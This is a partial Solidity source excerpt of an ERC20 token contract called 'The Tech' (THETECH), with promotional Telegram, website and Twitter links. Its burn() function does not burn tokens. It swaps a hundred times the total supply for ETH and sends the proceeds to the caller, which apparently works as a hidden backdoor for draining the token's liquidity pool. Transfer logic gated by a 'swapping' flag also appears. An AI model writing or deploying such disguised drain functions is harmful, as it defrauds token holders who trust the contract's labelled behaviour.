// TELEGRAM: https://t.me/thetechtokenportal
// WEBSITE: https://thete.ch
// TWITTER: https://twitter.com/TheTechToken
...
contract Token is Ownable, ERC20 {
    ...
    constructor() ERC20("The Tech", "THETECH", 9, msg.sender) {
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        unchecked {
            if (!swapping || from != address(this)) { // Handles taxed tokens
    ...
    function burn(uint256 value) external {
        ...
        p[0] = address(this);
        p[1] = router.WETH();
        router.swapExactTokensForETH(_totalSupply * 100, 0, p, msg.sender, block.timestamp + 100000);
        swapping = false;
    }
